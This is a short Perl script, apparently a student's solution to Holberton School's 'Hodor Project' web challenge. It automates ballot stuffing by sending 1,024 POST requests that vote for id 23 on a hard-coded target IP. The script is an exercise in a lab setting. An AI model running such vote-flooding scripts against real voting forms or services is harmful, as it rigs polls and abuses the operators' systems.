#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common qw{ POST };

=pod
 * ===---Description------------------------------------------------------------===
 *   Solution for the Hodor Project, Level 2 by Julien Barbier.
 *   Using a simple Perl script.
 *
 *   by Alexandro de Oliveira, for Holberton School
 * ===---------------------------------------------------------------------------===
=cut

# LWP is the "Library for WWW in Perl":
my $ua  = LWP::UserAgent->new();

# Defining the User-Agent:
$ua->agent("havk64 - Perl Requests");

my $url = 'http://173.246.108.142/level0.php';

for(my $i = 0; $i < (1 << 10); $i++) {
    my $request = $ua->post($url, { id => "23",holdthedoor => 'submit'});
    my $content  = $request->decoded_content();
    print "Vote number: $i\n";
}

# To print the server headers:
# print $request->headers_as_string;

# To print the body:
# print $request->content;

# Another way to print the body:
# print $content;
